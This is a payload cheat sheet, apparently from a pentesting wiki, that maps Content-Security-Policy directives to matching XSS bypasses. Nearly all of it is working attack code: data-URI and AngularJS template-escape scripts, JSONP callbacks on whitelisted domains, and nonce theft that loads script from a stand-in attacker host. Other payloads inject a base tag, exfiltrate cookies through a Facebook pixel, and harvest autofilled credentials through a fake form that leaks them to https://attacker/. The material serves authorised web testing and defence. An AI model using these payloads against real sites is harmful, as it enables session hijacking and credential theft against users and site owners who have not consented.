---
title: "Payloads: CSP Bypass"
type: payloads
tags: [payloads, csp, csp-bypass, xss, web]
sources: [hacktricks-web]
date_created: 2026-07-15
date_updated: 2026-07-15
---

# Payloads: CSP Bypass

Content-Security-Policy is an XSS mitigation, not a fix. Parse the live policy first, then map each directive to the matching gadget. Complements [[xss]] and [[dangling-markup]].

```bash
curl -sI https://target/ | grep -i content-security-policy
```

## Directive-to-bypass map

- **`unsafe-inline` present** - plain reflected XSS still fires:

```html
"/><script>alert(1)</script>
```

- **`unsafe-eval` / `data:` in script-src** - load script from a data URI:

```html
<script src="data:;base64,YWxlcnQoMSk="></script>
```

- **Missing `object-src` / `default-src`** - execute via `<object>`:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

- **`script-src 'self'` + file-upload primitive** - upload JS under a mis-served extension and load it same-origin (needs MIME misinterpretation; polyglots help):

```html
"/><script src="/uploads/pic.png.js"></script>
```

- **Whitelisted CDN** (`ajax.googleapis.com`, `cdnjs.cloudflare.com`) - load a vulnerable AngularJS and template-escape (see [[ssti]] CSTI):

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
```

- **Whitelisted domain with a JSONP endpoint** - arbitrary callback = script exec (JSONBee lists ready endpoints per host):

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=x&callback=alert#1"></script>
"><script src="https://accounts.google.com/o/oauth2/revoke?callback=YOUR_JS"></script>
```

- **`nonce` without `strict-dynamic`** - steal the live nonce from the DOM and reuse it (fires from an HTML/AngularJS gadget, no inline script needed):

```javascript
a=document.querySelector("[nonce]");b=document.createElement("script");
b.src="//attacker/evil.js";b.nonce=a.nonce;document.body.appendChild(b);
```

- **Missing `base-uri` + a relative-path nonce'd script** (`<script src="/js/app.js">`) - inject a base tag to reload it from your host (use an HTTPS base if the page is HTTPS):

```html
<base href="https://attacker/">
```

- **`strict-dynamic`** - any nonce/hash-allowed script that DOM-creates a new `<script>` propagates trust to it.
- **Path allowlist** (`https://site/scripts/react/`) - bypass via relative-path overwrite (RPO); the browser keeps `%2f`, the server decodes it:

```html
"><script src="https://site/scripts/react/..%2fangular%2fangular.js"></script>
```

- **Server-side open redirect on an allowed origin** - CSP ignores the path after a redirect:

```html
<script src="http://allowed/redirect?u=...evil..."></script>
```

- **Third-party exfil-only bypass** - if `connect-src`/`default-src` allows Facebook/Google Analytics/Cloudfront/Firebase/Heroku, register on that service and exfil through its SDK gadget:

```javascript
fbq('trackCustom', 'x', {data: document.cookie})
```

- **Policy injection** - if input lands inside the CSP header itself, append `;script-src-elem *` (Chrome, overwrites script-src) or `;_` (Edge drops the whole policy).

## Scriptless techniques (strict CSP)

- **Credential theft under `form-action 'self'`** - inject a fake login form, let the password manager autofill it, submit as GET so creds land in the URL, then leak via Referer:

```html
<form action="/"><input name="username"><input name="password" type="password"></form>
<meta name="referrer" content="unsafe-url">
<meta http-equiv="Refresh" content="0;url=https://attacker/">
```

- **Service-worker `importScripts()`** is not CSP-restricted; dangling-markup and `<meta http-equiv>` refresh survive script-only policies (see [[dangling-markup]]).

## Sources
- HackTricks (pentesting-web) (slug: hacktricks-web).
